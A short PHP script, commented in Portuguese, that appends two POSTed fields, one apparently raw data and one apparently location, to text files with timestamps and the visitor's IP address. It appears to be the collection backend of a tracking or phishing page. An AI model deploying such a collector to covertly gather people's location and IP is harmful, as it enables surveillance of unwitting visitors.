<?php
$raw = fopen("raw.txt", "a") or die("cannot open!");
$location = fopen("location.txt", "a") or die("cannot open!");
$date = date('d/m h:i A P e')."\n";
$txt ="\n". $_POST["param1"]."\n";
$txt2 = "\n". $_POST["param2"]."\n";
fwrite($raw, $txt);
fwrite($raw, $date);
fwrite($location, $txt2);
fwrite($location, $date);

//

$http_client_ip       = $_SERVER['HTTP_CLIENT_IP'];
$http_x_forwarded_for = $_SERVER['HTTP_X_FORWARDED_FOR'];
$remote_addr          = $_SERVER['REMOTE_ADDR'];
 
/* VERIFICO SE O IP REALMENTE EXISTE NA INTERNET */
if(!empty($http_client_ip)){
    $ip = $http_client_ip;
    /* VERIFICO SE O ACESSO PARTIU DE UM SERVIDOR PROXY */
} elseif(!empty($http_x_forwarded_for)){
    $ip = $http_x_forwarded_for;
} else {
    /* CASO EU NÃO ENCONTRE NAS DUAS OUTRAS MANEIRAS, RECUPERO DA FORMA TRADICIONAL */
    $ip = $remote_addr."\n";
}
 
//echo $ip
fwrite($location,"IP: " . $ip);


//



fclose($raw);
fclose($location);



?>
